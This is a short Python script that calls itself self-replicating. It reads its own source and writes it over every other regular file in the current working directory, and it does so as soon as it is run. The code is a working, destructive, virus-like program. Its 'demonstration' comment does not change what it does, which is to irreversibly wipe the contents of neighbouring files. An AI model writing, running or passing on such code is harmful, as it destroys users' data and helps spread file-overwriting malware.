import os


def self_replicate(directory):
    # Get the name of the current script
    current_script = os.path.abspath(__file__)

    # Read the contents of the current script
    with open(current_script, 'r') as file:
        script_content = file.read()

    # Iterate over all files in the specified directory
    for filename in os.listdir(directory):
        file_path = os.path.join(directory, filename)

        # Only replicate to regular files, not directories or the current script itself
        if os.path.isfile(file_path) and file_path != current_script:
            with open(file_path, 'w') as target_file:
                target_file.write(script_content)


if __name__ == "__main__":
    # Specify the directory to replicate to (for demonstration purposes, we use the current directory)
    target_directory = os.getcwd()

    # Run the self-replication function
    self_replicate(target_directory)
